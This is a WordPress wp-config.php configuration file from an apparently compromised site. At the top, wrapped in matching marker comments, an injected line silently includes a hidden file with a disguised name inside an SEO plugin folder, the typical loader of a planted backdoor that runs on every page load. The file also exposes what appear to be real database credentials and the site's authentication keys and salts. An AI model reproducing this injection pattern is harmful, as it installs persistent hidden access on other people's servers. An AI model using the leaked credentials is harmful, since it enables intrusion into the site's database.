<?php
/*7de74*/

@include ("/home1/yaldeyha/public_html/gelectronic/wp-content/plugins/wordpress-seo/.f66bb73b.ott");

/*7de74*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', "yaldeyha_gele");

/** MySQL database username */
define('DB_USER', "yaldeyha_gele");

/** MySQL database password */
define('DB_PASSWORD', "y^]V=d#hr+1m");

/** MySQL hostname */
define('DB_HOST', "localhost:3306");

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'mH>NrVH lBK2V:j!W!%RuV9u(Sp}rP8Em tf5cG`0W_=BySg?A,j{S!-)LtWdy*9');
define('SECURE_AUTH_KEY',  'f%S`koX@e.XO<?th0{}EB~5DhAbdT~oT.7Ubo)RWHFkq_7TQtP?c?hLrO,IM{l}Z');
define('LOGGED_IN_KEY',    ':&sj2bymJ~o X11!VOmOB;{@ui9m|){~tMr7mG.6uZfdLTofgu^s^ M kLl~lOHj');
define('NONCE_KEY',        ']pPlZS)zZZ(&Mn[DhLRhB<WQhwo}qy4kVV(4EuJzr7=urh,.G>}2yHBL(7;BbW-1');
define('AUTH_SALT',        'M)H7Gi<r-@whj?QOhA,%v(Y/*%FG#<MB+iQ`2oFh8#.Qg~f/!P$g/ooM=5._o9>v');
define('SECURE_AUTH_SALT', '1WuO![D.#<i~N8swRkhVrwpQ;c<OO9gH1|BJz/s|#KE:Ndi._o/650nuH{NPbV*.');
define('LOGGED_IN_SALT',   '[]%U`%Px9A:Hy<HR]JlXI6)uEWD#a[o`IdU}#BPDk%,=8EH,9#FGH`.qn8`?KW{n');
define('NONCE_SALT',       'qbt,nYnDc.NSnxx#&Flj3`zG$KMlmzaFKW|TXegymVxRfH1t(J>K*e={!B&jsnSf');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
